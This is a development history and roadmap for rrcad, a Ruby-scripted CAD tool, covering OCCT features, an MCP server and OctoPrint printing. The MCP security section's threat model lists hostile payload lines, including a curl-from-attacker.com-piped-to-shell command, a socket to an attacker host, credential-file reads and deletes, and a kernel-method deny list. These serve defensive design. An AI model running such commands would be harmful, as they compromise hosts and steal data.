# rrcad — Implementation History

A Ruby DSL-driven 3D CAD language. Rust as the glue layer, mRuby as the
scripting engine, OCCT as the geometry kernel.

---

## ✓ Phase 0 — OCCT Minimal Rust Bindings

`cxx` bridge to OCCT 7.9. Primitives (`box`, `cylinder`, `sphere`), boolean
ops (`fuse`, `cut`, `common`), fillets, chamfers, transforms, and STEP/STL/glTF
export. See `src/occt/`.

---

## ✓ Phase 1 — mRuby Embedded in Rust

mRuby 3.4.0 vendored; C glue shim (`glue.c`) hides `mrb_value` from Rust.
`MrubyVm` RAII wrapper. Native `Shape` class backed by `Box<occt::Shape>` raw
pointer in mRuby `RData void*`. DSL prelude auto-loaded via `include_str!`.
REPL with readline and history. See `tests/e2e_dsl.rs`.

---

## ✓ Phase 2 — DSL Enrichment

Transforms: `.translate`, `.rotate`, `.scale`, `.mirror`. Modifiers: `.fillet`,
`.chamfer`. Sketch ops: `.extrude`, `.revolve`. 2D faces: `rect`, `circle`.
`solid do…end` block. `Assembly` with `place`. REPL tab-completion and `help`.
See `tests/phase2_dsl.rs`.

---

## ✓ Phase 3 — Splines, Sweep, Live Preview

Spline profiles (`spline_2d`, `spline_3d`) and pipe sweep (`.sweep`) via
`GeomAPI_Interpolate` + `BRepOffsetAPI_MakePipe`. Sub-shape selectors:
`.faces`, `.edges`. Live preview: `rrcad --preview <script.rb>` — `axum` HTTP
server + Three.js viewer + WebSocket live reload via `notify`. `preview(shape)`
is a no-op outside preview mode. See `tests/teapot_dsl.rs`, `tests/phase3_selectors.rs`.

---

## ✓ Phase 4 — OCCT Coverage (OpenSCAD / CadQuery parity)

Additional primitives: `cone`, `torus`, `wedge`. 2D profiles: `polygon`,
`ellipse`, `arc`. 3-D ops: `loft`, `.shell`, `.offset`, `.extrude(twist/scale)`.
Non-uniform scale (`.scale(sx,sy,sz)`). Selective fillet/chamfer by edge
selector. Patterns: `linear_pattern`, `polar_pattern`. Vertex selector.
Direction-based face selector (`">Z"` / `"<X"` etc.). OBJ export. STEP/STL
import. Query: `.bounding_box`, `.volume`, `.surface_area`. OCCT API hardening:
builder-style booleans with fuzzy tolerance, parallel tessellation, GLB TRS
transform format, `BRepCheck_Analyzer` validity guard before export.
See `tests/phase4_3d_ops.rs`, `tests/occt_layer.rs`.

---

## ✓ Phase 5 — Parametric Design & Assembly

`param :name, default:, range:` DSL declaration with `--param key=value` CLI
override. Design table batch export via `--design-table table.csv`. Per-shape
sRGB color (`.color(r,g,b)`) written into GLB/glTF/OBJ via `XCAFDoc_ColorTool`.
Assembly mating (`Shape#mate`, `Assembly#mate`) using OCCT planar face geometry:
normal alignment + centroid translation, with optional gap/interference offset.
Spline tangent constraints (`tangents:` keyword on `spline_2d`/`spline_3d`).
Feature removal (`.simplify(min_feature_size)`) via `BRepAlgoAPI_Defeaturing`.
See `tests/phase5_params.rs`, `tests/e2e_dsl.rs`.

---

## ✓ Phase 6 — Variable-Section Sweep &amp; Teapot Rebuild

`sweep_sections(path, [profile, ...])` DSL function backed by
`BRepOffsetAPI_MakePipeShell`.  Each origin-centred profile is automatically
translated to the corresponding spine point (evenly-distributed along the
spline parameter) and swept with `WithCorrection=true` so cross-sections stay
perpendicular to the spine tangent.  Falls back to `BRepOffsetAPI_ThruSections`
when `MakeSolid()` fails on highly-curved spines (e.g., the teapot handle
C-arc).  See `tests/teapot_dsl.rs` (`sweep_sections_*` tests).

`bezier_patch([pt0..pt15])` — builds a single bicubic Bézier face from
16 control points (4×4 row-major grid) using `Geom_BezierSurface` +
`BRepBuilderAPI_MakeFace`.  `sew([faces], tolerance:)` — assembles multiple
Bézier faces into a closed shell/solid via `BRepBuilderAPI_Sewing` +
`BRepBuilderAPI_MakeSolid`.  Primary use case: Utah Teapot from Newell patches.

---

## ✓ Utah Teapot Sample

`samples/07_teapot.rb` — rebuilt from the original Newell Bézier patch data
(sourced from https://users.cs.utah.edu/~dejohnso/models/teapot.html, ×3.0 scale).
All 28 bicubic Bézier patches from the Newell / Blinn dataset.  Coordinate
transform Y-up → Z-up: `pt(x,y_s,z_s)` → rrcad `[x, z_s, y_s]`.  Patches
sewn with `BRepBuilderAPI_Sewing` (tolerance 1e-3) into a continuous surface;
`scale(3.0)` → rim at Z≈6.75, lid knob at Z=9.0.  Open at the base (no bottom
disc — consistent with the original Newell definition).
Validated by `tests/teapot_sample.rs` (9 tests including `bezier_patch` and
`sew` unit tests).

---

## Phase 7 — Improve OCCT Coverage & Compatibility

### ✓ Tier 1 — Quick wins, high ROI (complete existing patterns)

All four Tier 1 features are implemented and tested in `tests/phase7_tier1.rs` (12 tests).

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 1 | **Asymmetric chamfer** ✓ | `.chamfer_asym(d1, d2[, :sel])` | `BRepFilletAPI_MakeChamfer::Add(d1, d2, edge, face)` with edge→face map |
| 2 | **2D profile offset** ✓ | `.offset_2d(d)` | `BRepOffsetAPI_MakeOffset` on a Face or Wire |
| 3 | **Grid pattern** ✓ | `grid_pattern(s, nx, ny, dx, dy)` | Pure Rust: two nested `linear_pattern` calls |
| 4 | **Multi-shape fuse/cut** ✓ | `fuse_all([a,b,c])`, `cut_all(base,[t1,t2])` | Fold-left over existing `.fuse` / `.cut` in Rust |

### ✓ Tier 2 — Validation & introspection (robustness for real workflows)

All four Tier 2 features are implemented and tested in `tests/phase7_tier2.rs` (12 tests).

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 5 | **Shape type query** ✓ | `.shape_type` → `:solid/:shell/:face/:wire/:edge/:vertex` | `shape.ShapeType()` → `TopAbs_ShapeEnum` |
| 6 | **Closed / manifold check** ✓ | `.closed?`, `.manifold?` | `TopTools_IndexedDataMapOfShapeListOfShape` edge→face map |
| 7 | **Centroid** ✓ | `.centroid` → `[x, y, z]` | `BRepGProp::VolumeProperties/SurfaceProperties/LinearProperties` dispatch |
| 8 | **Topology validation** ✓ | `.validate` → `:ok` or error list | `BRepCheck_Analyzer` (already used in export guard) |

### ✓ Tier 3 — Surface modeling (next frontier)

All three Tier 3 features are implemented and tested in `tests/phase7_tier3.rs` (10 tests).

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 9 | **Ruled surface** ✓ | `ruled_surface(wire_a, wire_b)` | `BRepFill::Shell` (static method) |
| 10 | **Fill surface** ✓ | `fill_surface(boundary_wire)` | `BRepFill_Filling` with C0 edge constraints |
| 11 | **Slice by plane** ✓ | `.slice(plane: :xy, z: 5.0)` → compound | `BRepAlgoAPI_Section` |

### Tier 4 — Interop (legacy CAD exchange)

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 12 | **IGES import** | `import_iges("file.igs")` | `IGESControl_Reader` |
| 13 | **IGES export** | `shape.export("file.igs")` | `IGESControl_Writer` |
| 14 | **SVG export** (2D projection) | `shape.export("file.svg")` | Orthographic projection → polylines |

### Tier 5 — Phase 8 candidates (include only if time allows)

- **Draft angle extrude** — `.extrude(h, draft: 5.0)` — tapered walls for moulded parts
- **Path pattern** — `path_pattern(shape, spline_path, n)` — copies at equal arc-length steps along a curve
- **Closest point / collision** — `.distance_to(other)` → float — `BRepExtrema_DistShapeShape`
- **Moment of inertia** — `.inertia` → tensor — `BRepGProp::VolumeProperties`
- **2D Boolean on sketches** — `sketch_a.fuse_2d(sketch_b)` — `BRepAlgoAPI_*` restricted to Face shapes
- **Wire fillet** (pre-profile) — `.fillet_wire(r)` — round 2D sketch corners before extrude
- **Pipe with guide curve** — advanced sweep; `BRepFill_PipeShell` with guide surface
- **Convex hull** — `.convex_hull` — bounding convex solid (OpenSCAD `hull()` parity)

### Implementation order

```
Week 1:  Tier 1 (#1–4)  — asymmetric chamfer, offset_2d, grid_pattern, fuse_all/cut_all
Week 2:  Tier 2 (#5–8)  — shape_type, closed?/manifold?, centroid, validate
Week 3:  Tier 3 (#9–11) — ruled_surface, fill_surface, slice
Week 4:  Tier 4 (#12–14) — IGES import/export, SVG export
Week 5+: Tier 5 / Phase 8
```

### Notes

- Tier 1 + 2 require almost no new C++ — completing existing patterns in Rust/glue.c.
- Surface modeling (Tier 3) introduces face-only shapes (not solids); `BRepCheck_Analyzer`
  is the safety net. `BRepFill_Filling` boundary wires must be closed.
- IGES follows the same reader/writer pattern as STEP — no architectural change.
- SVG export requires orthographic projection; a visible-edges-only wireframe is a good v1.
- Draft angle extrude is common for manufacturing but needs its own OCCT path; punted to
  Phase 8 to keep Phase 7 focused.

---

## Phase 8 — Part Design: Sketch-on-Face, Pad & Pocket

**Goal:** close the gap with FreeCAD's Part Design workbench for "CAD as code" workflows.
FreeCAD's core loop is: select a face → sketch in its plane → pad (extrude outward) or
pocket (cut inward).  This phase brings that loop to the Ruby DSL, making rrcad a credible
alternative for mechanical part modelling without a GUI.

### The core DSL pattern

```ruby
plate = box(100, 60, 10)

# Pocket: cut a rounded slot from the top face
result = plate.pocket(:top, depth: 8) do
  rect(40, 20).fillet_wire(4)          # 2D sketch in face-local coords
end

# Pad: add a boss on the bottom face
result = plate.pad(:bottom, height: 6) do
  circle(10)
end

# Arbitrary face by index or direction string
result = plate.pocket(">X", depth: 5) do
  circle(4).translate(0, 5)            # face-local X/Y
  circle(4).translate(0, -5)
end
```

Face-local coordinate system: origin at the face centroid, X/Y along the face
tangent directions, Z along the outward normal.  All 2D shapes in the block are
interpreted in this local frame.  The implementation transforms them to world
coordinates before extrude/cut.

### ✓ Tier 1 — Core Part Design primitives

All four Tier 1 features are implemented and tested in `tests/phase8_tier1.rs` (11 tests).

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 1 | **Pad** ✓ | `.pad(face_sel, height:) { sketch }` | `BRepPrimAPI_MakePrism` along face normal + `BRepAlgoAPI_Fuse` |
| 2 | **Pocket** ✓ | `.pocket(face_sel, depth:) { sketch }` | `BRepPrimAPI_MakePrism` along −normal + `BRepAlgoAPI_Cut` |
| 3 | **Wire fillet** ✓ | `.fillet_wire(r)` on a Face/Wire | `BRepFilletAPI_MakeFillet2d` |
| 4 | **Datum plane** ✓ | `datum_plane(origin:, normal:, x_dir:)` | `gp_Ax3` + `BRepBuilderAPI_MakeFace(gp_Pln)` — returns a reusable plane shape for `.pad`/`.pocket` |

Implementation of face-local transform (shared by pad + pocket):
1. `BRep_Tool::Surface(face)` → cast to `Geom_Plane` → get `gp_Ax3`
2. `BRepGProp::SurfaceProperties` → face centroid as `gp_Pnt` origin
3. `gp_Trsf::SetTransformation(ax3)` → maps world → face-local (invert for local → world)
4. `BRepBuilderAPI_Transform(sketch, trsf)` → sketch in world coords
5. `BRepPrimAPI_MakePrism(sketch_face, normal_vec * depth)` → tool solid
6. `BRepAlgoAPI_Fuse` (pad) or `BRepAlgoAPI_Cut` (pocket)

### ✓ Tier 2 — Manufacturing features

All four Tier 2 features are implemented and tested in `tests/phase8_tier2.rs` (13 tests).

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 5 | **Draft angle** ✓ | `.extrude(h, draft: angle_deg)` | `BRepPrimAPI_MakePrism` + `BRepOffsetAPI_DraftAngle` on lateral faces |
| 6 | **Helix path** ✓ | `helix(radius:, pitch:, height:)` → Wire | `GeomAPI_Interpolate` (16 samples/turn BSpline) |
| 7 | **Thread** ✓ | `thread(solid, face_sel, pitch:, depth:)` | helix path + triangular polygon profile + `.sweep` + `.cut` — pure Ruby DSL |
| 8 | **Counterbore / countersink** ✓ | `cbore(d:, cbore_d:, cbore_h:, depth:)`, `csink(d:, csink_d:, csink_angle:, depth:)` | pure Ruby DSL — `circle.extrude` + `cone` + `.fuse`; use with `.cut` |

### ✓ Tier 3 — Inspection & clearance

All three Tier 3 features are implemented and tested in `tests/phase8_tier3.rs` (10 tests).

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 9 | **Distance between shapes** ✓ | `.distance_to(other)` → Float | `BRepExtrema_DistShapeShape` |
| 10 | **Moment of inertia** ✓ | `.inertia` → `{ixx:, iyy:, izz:, ixy:, …}` | `BRepGProp::VolumeProperties` → `GProp_GProps::MatrixOfInertia` |
| 11 | **Minimum wall thickness** ✓ | `.min_thickness` → Float | Ray-casting via `IntCurvesFace_ShapeIntersector` — shoots inward ray from each face centroid, returns shortest intersection distance |

### Tier 4 — 2D drawing output

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 12 | **Slice to face** | `.slice(plane: :xy, at: 5.0)` → Face | `BRepAlgoAPI_Section` |
| 13 | **SVG export** | `shape.export("part.svg", view: :top)` | `HLRBRep_Algo` (hidden-line removal) + `HLRBRep_HLRToShape` → polylines → SVG |
| 14 | **DXF export** | `shape.export("part.dxf")` | slice → wire edges → `DXF_Writer` (lightweight hand-rolled or via `IFSelect`) |

SVG via HLRBRep: `HLRBRep_Algo` computes visible / hidden edges from a given
projection direction; `HLRBRep_HLRToShape` extracts them as `TopoDS_Edge` collections;
each edge is tessellated into polyline segments and serialised as SVG `<path>` elements.
This is the same pipeline FreeCAD's TechDraw uses internally.

### Tier 5 — Advanced composition

| # | Feature | DSL | OCCT API |
|---|---------|-----|----------|
| 15 | **Boolean fragment** | `fragment([a, b, c])` → Array of solids | `BRepAlgoAPI_BuilderAlgo` (general fuser that keeps all fragments) |
| 16 | **Convex hull** | `.convex_hull` | `BRepBuilderAPI_Copy` + `BRepAlgoAPI_Fuse` fold (no native OCCT hull; wrap qhull or approximate via point cloud + loft) |
| 17 | **Path pattern** | `path_pattern(shape, path, n)` | `BRepGProp_SurfaceProperties` arc-length param → `n` equally spaced transforms |
| 18 | **Pipe with guide** | `sweep(profile, path, guide:)` | `BRepFill_PipeShell::SetMode(guide_wire)` |

### Implementation order

```
Sprint 1: Tier 1 (#1–4) — pad, pocket, fillet_wire, datum_plane
          These four together unlock the core FreeCAD Part Design loop in rrcad.

Sprint 2: Tier 2 (#5–8) — draft angle, helix, thread, cbore macro
          Manufacturing features; helix is the prerequisite for thread.

Sprint 3: Tier 3 (#9–11) — distance_to, inertia, min_thickness
          Inspection / clearance checks; pure OCCT queries, no new topology.

Sprint 4: Tier 4 (#12–14) — slice, SVG export, DXF export
          2D drawing output; SVG via HLRBRep is the most complex item here.

Sprint 5: Tier 5 (#15–18) — fragment, convex hull, path pattern, guided sweep
          Advanced composition; lower priority, implement as demand arises.
```

### Notes

- **pad / pocket are the highest-priority items** — they alone cover the majority of
  FreeCAD Part Design workflows that users would want to do in code.
- `fillet_wire` is a prerequisite for rounded pockets (slot with rounded ends, etc.)
  and must land in the same sprint as pad/pocket.
- The face-local transform logic (`gp_Ax3` → `gp_Trsf`) is shared by pad, pocket, and
  datum_plane; implement it once as a C++ helper and reuse.
- SVG export via `HLRBRep_Algo` is the single largest new subsystem; it should be a
  separate sub-task with its own bridge class (similar to `ThruSectionsBuilder`).
- Thread is a compound feature (helix + profile sweep + cut) that can be implemented
  entirely in the Ruby DSL once helix is available — no new C++ needed for the thread
  feature itself.
- DXF v1 can be a hand-rolled ASCII writer (just LINE and ARC entities from sliced edges);
  no need for a full DXF library.

---

## Phase 9 — Model Context Protocol (MCP) Server

**Goal:** expose rrcad's CAD engine as an MCP server so any MCP-compatible AI
client (Claude Desktop, Claude Code, etc.) can generate and inspect 3D geometry
via natural language — no Ruby knowledge required from the user.

### Architecture

```
Claude Desktop / Claude Code
        ↓  MCP (stdio transport)
rrcad --mcp
        ↓
MrubyVm → OCCT kernel
        ↓
Shape results, exported files, preview URLs
```

A new `--mcp` CLI flag starts rrcad in MCP server mode.  The server runs on
**stdio** (standard for local MCP servers).  mRuby is not thread-safe, so tool
calls are processed serially on a single thread — stdio transport satisfies this
naturally because requests arrive one at a time.

### Dependency

```toml
# Cargo.toml
rmcp = { version = "0.1", features = ["server", "transport-io"] }
```

`rmcp` is the official Rust MCP SDK maintained by the MCP community.

### New source module: `src/mcp/mod.rs`

- Instantiate one `MrubyVm` for the lifetime of the server process.
- Register tools via `rmcp`'s `ServerHandler` trait.
- Serve over stdio with `rmcp::transport::stdio()`.
- Reuse the existing `axum` preview server from `src/preview/` for
  `cad_preview`.

### Tools

| Tool | Input (JSON) | Output |
|------|-------------|--------|
| `cad_eval` | `{ "code": "<ruby dsl>" }` | `{ shape_type, volume, surface_area, bounding_box: {x,y,z,dx,dy,dz}, valid: bool }` |
| `cad_export` | `{ "code": "<ruby dsl>", "format": "step\|stl\|glb\|obj" }` | `{ "path": "/tmp/rrcad_<hash>.<ext>" }` |
| `cad_preview` | `{ "code": "<ruby dsl>" }` | `{ "url": "http://localhost:<PORT>" }` — starts the Three.js live preview server |
| `cad_validate` | `{ "code": "<ruby dsl>" }` | `{ "status": "ok" }` or `{ "errors": ["..."] }` |

#### `cad_eval` detail

Evaluates the Ruby DSL code in a fresh `MrubyVm`, then calls `.shape_type`,
`.volume`, `.surface_area`, `.bounding_box`, and `.validate` on the last
returned shape.  Returns all properties in one response so the AI can reason
about the geometry without a second round-trip.

#### `cad_export` detail

Evaluates the code, calls `shape.export("/tmp/rrcad_<uuid>.<ext>")`, and
returns the absolute path.  The AI client or user can then open the file in
their CAD tool of choice.  Supported formats: `step`, `stl`, `glb`, `gltf`,
`obj`.

#### `cad_preview` detail

Evaluates the code and calls the existing `src/preview/` axum server.  If the
server is not yet running it is started on a random free port.  Returns the
`http://localhost:PORT` URL for the user to open in a browser.

### Resources

| URI | Description |
|-----|-------------|
| `rrcad://api` | Full DSL reference (`doc/api.md`) — lets the AI look up method signatures and examples without asking the user |
| `rrcad://examples` | Contents of `samples/` — concrete Ruby DSL scripts the AI can adapt |

### Example interaction

```
User:  "Make a 50×30×20 box with an M4 counterbore hole and show me the volume"

Claude → cad_eval({
           code: "box(50,30,20).cut(cbore(d:4, cbore_d:8, cbore_h:3, depth:25))"
         })
       ← { shape_type: "solid", volume: 28234.5, bounding_box: {...}, valid: true }

Claude → cad_export({ code: "...", format: "step" })
       ← { path: "/tmp/rrcad_a3f9.step" }
```

### Implementation order

```
Sprint 1: Add rmcp dependency; wire --mcp CLI flag; stub ServerHandler.
Sprint 2: Implement cad_eval + cad_validate (pure MrubyVm, no file I/O).
Sprint 3: Implement cad_export (reuse existing .export_* path).
Sprint 4: Implement cad_preview (reuse src/preview/ axum server).
Sprint 5: Expose rrcad://api and rrcad://examples resources.
```

### Notes

- Keep the MCP server entirely in `src/mcp/`; do not entangle it with the
  existing REPL (`src/main.rs`) or preview server (`src/preview/`) logic beyond
  calling their public APIs.
- Error handling: Ruby eval errors and OCCT exceptions must be caught and
  returned as MCP `isError: true` tool results — never panic the server process.
- The `MrubyVm` instance should be reset (or recreated) between tool calls to
  prevent state leaking from one call to the next.
- `cad_export` writes to `/tmp`; add a TTL cleanup or document that the user is
  responsible for removing exported files.

---

### Security

The MCP server evaluates Ruby DSL code supplied by an AI model.  The code is
not written by a human developer — it is generated at runtime and could contain
hostile payloads injected via prompt-injection attacks or model misbehaviour.
Every layer of defence below must be in place before the MCP mode is shipped.

#### Threat model

| Threat | Example payload | Impact |
|--------|----------------|--------|
| Filesystem read | `File.read("/etc/passwd")` | Data exfiltration |
| Filesystem write/delete | `File.delete("/home/user/.ssh/authorized_keys")` | Data loss / privilege escalation |
| Shell execution | `IO.popen("curl attacker.com \| sh")` | Full host compromise |
| Network access | `require 'socket'; TCPSocket.new("attacker.com", 443)` | Data exfiltration / C2 |
| Directory traversal | `Dir.glob("/**/*")` | Information disclosure |
| Resource exhaustion | `loop { x = "A" * 10_000_000 }` | DoS / OOM |
| State pollution | Redefine `box`, `cut`, etc. between calls | Corrupted subsequent tool results |

#### Mitigation 1 — Custom MCP-safe mRuby build (most important)

The current vendored mRuby is built with `gembox 'default'`, which pulls in
`stdlib-io` (`mruby-io`, `mruby-socket`, `mruby-dir`, `mruby-errno`) and
`metaprog` (`mruby-eval`, `mruby-metaprog`).  These are the primary attack
surface.

Create a dedicated `mcp_safe.gembox` that includes **only** what the DSL needs:

```ruby
# vendor/mruby/build_config/mcp_safe.gembox
MRuby::GemBox.new do |conf|
  conf.gembox "stdlib"      # String, Array, Hash, Comparable, Enumerable, …
  conf.gembox "math"        # Math module (sin, cos, sqrt, …)
  # Deliberately omitted:
  #   stdlib-io   → mruby-io, mruby-socket, mruby-dir (filesystem + network)
  #   metaprog    → mruby-eval, mruby-metaprog (dynamic eval + reflection)
end
```

Build with this gembox when `--mcp` is active.  Removing `mruby-io` at compile
time eliminates `File`, `IO`, `Dir`, `Socket`, and `IO.popen` from the VM
entirely — no runtime checks needed.  This is the only reliable mitigation for
shell-execution attacks.

#### Mitigation 2 — Runtime prelude hardening (defence in depth)

Even with the restricted gembox, define a Ruby prelude that disables any
remaining dangerous kernel methods before user code runs:

```ruby
# Evaluated once at VM startup in MCP mode, before loading the DSL prelude.
[
  :system, :exec, :spawn, :fork, :exit, :exit!, :abort,
  :`, :puts, :print, :p, :pp, :gets, :readline
].each do |m|
  Kernel.send(:undef_method, m) rescue nil
end
```

This is a second line of defence — it does not replace Mitigation 1 but covers
any core methods not gated behind a gem.

#### Mitigation 3 — Execution timeout

Wrap every `MrubyVm::eval` call in a watchdog thread.  If evaluation exceeds
the limit, send `SIGALRM` (Unix) or terminate the thread and return an error:

```rust
const MCP_EVAL_TIMEOUT: Duration = Duration::from_secs(30);
```

Prevents infinite loops and pathologically large geometry from stalling the
server indefinitely.

#### Mitigation 4 — Memory limit

Before spawning the mRuby eval, set an address-space ceiling via
`setrlimit(RLIMIT_AS)` (Linux / macOS) to prevent the Ruby code from
allocating unbounded memory and triggering OOM:

```rust
// ~512 MB: enough for complex OCCT geometry; not enough to DoS the host.
const MCP_MEMORY_LIMIT_BYTES: u64 = 512 * 1024 * 1024;
```

#### Mitigation 5 — Export path confinement

`cad_export` must never accept a user-controlled output path.  The server
generates its own filename inside a fixed sandbox directory:

```
/tmp/rrcad_mcp/<UUID>.<ext>
```

- The sandbox directory is created on server startup with mode `0700`.
- Paths are never constructed from tool input; the format argument is
  validated against an allowlist (`step`, `stl`, `glb`, `gltf`, `obj`).
- Files are cleaned up after a configurable TTL (default: 1 hour) via a
  background sweeper thread.

#### Mitigation 6 — Per-call VM isolation

Recreate `MrubyVm` for every tool call.  This prevents:
- Global variable or constant pollution from a previous call affecting
  subsequent calls.
- A partially-evaluated script leaving the DSL in an inconsistent state.

Cost: ~5 ms per call (mRuby init + prelude load).  Acceptable for MCP latency.

#### Mitigation 7 — Input validation

Before passing the `code` string to `MrubyVm::eval`:

1. **Length cap** — reject inputs longer than 64 KB; legitimate DSL scripts
   are never this large.
2. **Null-byte check** — reject strings containing `\0`; mRuby's C string
   handling truncates at null bytes, which could bypass prelude hardening.
3. **Format allowlist** — the `format` parameter of `cad_export` must be
   one of `["step", "stl", "glb", "gltf", "obj"]`; reject everything else.

#### Mitigation 8 — OS-level sandboxing (optional, production hardening)

For deployments where stronger guarantees are needed, wrap the `rrcad --mcp`
process in an OS sandbox:

- **Linux** — `landlock` (filesystem access control, kernel ≥ 5.13) +
  `seccomp` (syscall allowlist).  Drop all syscalls except the minimum needed
  for OCCT computation (no `socket`, no `execve`, no `openat` outside the
  sandbox dir).
- **macOS** — `sandbox_init("no-internet", ...)` profile.

This is defence-in-depth on top of Mitigations 1–7; it requires no changes to
rrcad's Rust code, only the process launch wrapper (e.g. a systemd unit with
`SystemCallFilter=` or a shell wrapper using `unshare`).

#### Security checklist (must pass before shipping MCP mode)

- [ ] `mcp_safe.gembox` built and linked when `--mcp` is active
- [ ] `File`, `IO`, `Dir`, `Socket` unavailable inside a `cad_eval` call
      (verify with a test: `vm.eval("File.read('/etc/passwd')")` must raise)
- [ ] `IO.popen` unavailable (same test pattern)
- [ ] Eval timeout fires for `loop { }` within ≤ 30 s
- [ ] `cad_export` rejects format strings outside the allowlist
- [ ] `cad_export` output path is always under `/tmp/rrcad_mcp/`
- [ ] VM is recreated for each tool call (no state bleed between calls)
- [ ] Input longer than 64 KB returns `isError: true` without evaluating

---

## Phase 10 — OctoPrint Integration ("Build on Demand")

**Goal:** extend the MCP server with two new tools that bridge rrcad's geometry
pipeline to a physical 3D printer via the OctoPrint REST API.  A user can go
from natural language description → validated model → sliced file → running
print job without leaving the AI conversation.

### End-to-end workflow

```
User: "Print me an M4 bracket, 50×30×10 mm, wall thickness 3 mm"
        ↓
cad_eval      → validate geometry, check volume / bounding box
cad_export    → export to STL (or 3MF)
cad_print     → upload STL to OctoPrint, start print job
cad_status    → poll job progress, report % complete / ETA
```

### New MCP tools

#### `cad_print`

Upload a generated STL/3MF to OctoPrint and optionally start the print job.

| Field | Type | Description |
|-------|------|-------------|
| `code` | String | Ruby DSL to evaluate and export |
| `format` | `"stl"` \| `"3mf"` | Export format (STL is universally supported; 3MF preserves units/metadata) |
| `printer_url` | String | Base URL of the OctoPrint instance, e.g. `http://octopi.local` |
| `api_key` | String | OctoPrint API key (from OctoPrint → Settings → API) |
| `start` | Boolean | If `true`, start the print immediately after upload (default: `false`) |

Returns `{ "file": "<remote path>", "job_id": "<id>", "started": true/false }`.

OctoPrint REST calls:
1. `POST /api/files/local` — multipart upload of the STL file
2. `POST /api/job` with `{ "command": "start" }` if `start: true`

#### `cad_status`

Poll the current print job state.

| Field | Type | Description |
|-------|------|-------------|
| `printer_url` | String | Base URL of the OctoPrint instance |
| `api_key` | String | OctoPrint API key |

Returns `{ "state": "Printing", "progress": 42.5, "eta_seconds": 1820 }`.

OctoPrint REST call: `GET /api/job`.

### New source module: `src/octoprint/mod.rs`

A thin async HTTP client wrapping the two OctoPrint endpoints above.  Use the
`reqwest` crate (already common in the Rust ecosystem; add as a dependency with
`features = ["blocking"]` to keep the MCP server single-threaded):

```toml
reqwest = { version = "0.12", features = ["blocking", "multipart"] }
```

Keep all OctoPrint logic in `src/octoprint/`; the MCP tool handlers in
`src/mcp/` call into it.

### Configuration

OctoPrint connection settings should be configurable without recompiling.
Options (in preference order):

1. **Environment variables** — `OCTOPRINT_URL` and `OCTOPRINT_API_KEY`.
   Simple, works well with `.env` files and systemd `EnvironmentFile=`.
2. **CLI flags** — `--octoprint-url` and `--octoprint-api-key` on the
   `rrcad --mcp` invocation.
3. **Config file** — `~/.config/rrcad/octoprint.toml` (future; not required
   for v1).

The MCP tool input fields `printer_url` / `api_key` override the defaults for
that call, allowing multi-printer setups.

### Slicer consideration

OctoPrint does **not** slice; it sends GCode directly to the printer.  The STL
must be sliced to GCode before upload, or a slicing plugin must be installed on
the OctoPrint server.

Two viable paths for v1:

- **Recommend CuraEngine plugin** — OctoPrint's
  [CuraEngine Legacy](https://plugins.octoprint.org/plugins/curalegacy/) plugin
  can slice on upload.  `cad_print` passes `{ "print": true, "profile": "..." }`
  in the upload request to trigger server-side slicing.  Simplest integration;
  no extra dependency in rrcad.

- **Bundle PrusaSlicer CLI** — call `prusa-slicer --slice --export-gcode`
  locally before upload.  More control over slicer settings but requires
  PrusaSlicer to be installed on the host.  Implement as a future option.

Document the CuraEngine plugin path in `doc/development.md` when Phase 10 is
implemented.

### Security

- **API key** must never appear in MCP tool results or logs.  Redact it in all
  error messages.
- **`printer_url`** should be validated to be a well-formed `http://` or
  `https://` URL before making any requests; reject `file://`, `ftp://`, etc.
- **Timeout** — set a connect timeout (5 s) and read timeout (30 s) on all
  OctoPrint HTTP calls to prevent the MCP server from hanging indefinitely.
- **Upload size limit** — reject STL files larger than 100 MB before
  attempting the upload (pathological geometry could produce very large meshes).

### Implementation order

```
Sprint 1: src/octoprint/mod.rs — GET /api/job (cad_status, simplest endpoint)
Sprint 2: POST /api/files/local upload (cad_print without auto-start)
Sprint 3: POST /api/job start + cad_print start: true
Sprint 4: CuraEngine plugin slicing path
Sprint 5: Multi-printer config, CLI flags, .env support
```

---

## Architecture Notes

See `CLAUDE.md` and `doc/development.md` for the full architecture and
development guide.

- **Memory:** each `Shape` is a `Box<occt::Shape>` raw pointer in mRuby
  `RData void*`; the `dfree` GC callback drops it. No SlotMap, no reference
  counting.
- **Preview:** OCCT tessellation → GLB → `axum` HTTP → Three.js browser viewer
  → WebSocket live reload. Web-based preview is the long-term approach; a
  native egui/wgpu viewer is not planned.
